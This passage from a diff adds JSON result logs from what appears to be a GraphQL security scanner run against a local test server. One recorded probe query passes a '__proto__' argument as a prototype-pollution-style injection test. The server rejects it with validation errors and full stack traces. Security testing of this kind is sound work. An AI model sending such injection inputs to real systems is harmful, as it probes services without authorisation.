+                "GraphQLError: Field \"getCurrentRate\" argument \"mainCurrencySymbol\" of type \"String!\" is required, but it was not provided.",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/ProvidedRequiredArgumentsRule.js:62:33)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:344:29)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:390:21)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate\n  getCurrentRate(mainCurrencySymbol: \"USD\", __proto__: \"test\") \n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.011,
+    "timestamp": "2025-10-07T02:33:57.270327Z",
+    "count": 108,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Fields \"getCurrentRate\" conflict because they have differing arguments. Use different aliases on the fields to fetch both if this was intentional.",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            },
+            {
+              "line": 4,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Fields \"getCurrentRate\" conflict because they have differing arguments. Use different aliases on the fields to fetch both if this was intentional.",
+                "    at Object.SelectionSet (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/OverlappingFieldsCanBeMergedRule.js:67:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        },
+        {
+          "message": "Field \"getCurrentRate\" argument \"mainCurrencySymbol\" of type \"String!\" is required, but it was not provided.",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Field \"getCurrentRate\" argument \"mainCurrencySymbol\" of type \"String!\" is required, but it was not provided.",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/ProvidedRequiredArgumentsRule.js:62:33)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:344:29)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:390:21)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        },
+        {
+          "message": "Unknown argument \"__proto__\" on field \"Query.getCurrentRate\".",
+          "locations": [
+            {
+              "line": 4,
+              "column": 45
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Unknown argument \"__proto__\" on field \"Query.getCurrentRate\".",
+                "    at Object.Argument (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/KnownArgumentNamesRule.js:46:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  }
+]
